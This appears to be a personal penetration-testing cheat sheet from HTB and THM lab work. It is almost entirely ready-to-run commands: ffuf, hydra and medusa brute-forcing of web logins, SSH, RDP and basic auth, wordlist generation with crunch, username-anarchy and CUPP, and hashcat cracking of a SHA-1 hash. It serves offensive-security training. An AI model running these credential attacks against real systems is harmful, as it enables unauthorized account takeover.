````shell
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
````

#ffuf 

Word list: [[Automated Discovery]]

```bash
hydra -l milesdyson -P log1.txt $ip http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect" -t 20
```
or success condition: :S=302 or :S=Dashboard
failure condition :F=Invalid

```shell
 hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 94.237.53.230 -s 30768 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```


Multiple targets:
```shell
hydra -l root -p toor -M targets.txt ssh
```

#hydra


#### Default passwords:

- [https://cirt.net/passwords](https://cirt.net/passwords)
- https://default-password.info/
- https://datarecovery.com/rd/default-passwords/

https://wiki.skullsecurity.org/index.php?title=Passwords

#### Generate passwords:

`crunch 8 8 0123456789abcdefABCDEF -o crunch.txt` the file generated is 459 GB and contains 54875873536 words.

crunch also lets us specify a character set using the -t option to combine words of our choice. Here are some of the other options that could be used to help create different combinations of your choice:  

@ - lower case alpha characters

, - upper case alpha characters

% - numeric characters

^ - special characters including space

`user@thm$  crunch 6 6 -t pass%%`
           
Crunch will now generate the following amount of data: 700 bytes 0 MB 0 GB 0 TB 0 PB Crunch will now generate the following number of lines: 100 pass00 pass01 pass02 pass03`


### Username anarchy
```shell
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy

./username-anarchy Jane Smith > jane_smith_usernames.txt
```

### CUPP - Common User Passwords Profiler
Generates passwords based on personal info (name, nickname, birthday, etc.)
```shell
sudo apt install cupp -y

cupp -i
```



detect hash type
`λ kali ~ → hashid 8d6e34f987851aa599257d3831a1af040886842f`


dict based attack on sha-1
`λ kali ~ → hashcat -m 100 -a 0 8d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou.txt`

#### Bruteforce ssh
```bash
 hydra -L users.txt -P passwords.txt 10.129.131.97 ssh
 ```

#### Generate passwords of charset and from 6 to 8 chars:
```shell
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

#### Bruteforce basic auth
```shell
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```

#### Medusa

```shell
 medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh 
```

```shell-session
la1n23@htb[/htb]$ medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET 
```

 Perform additional checks for empty passwords (`-e n`) and passwords matching the username (`-e s`).
```shell
medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```
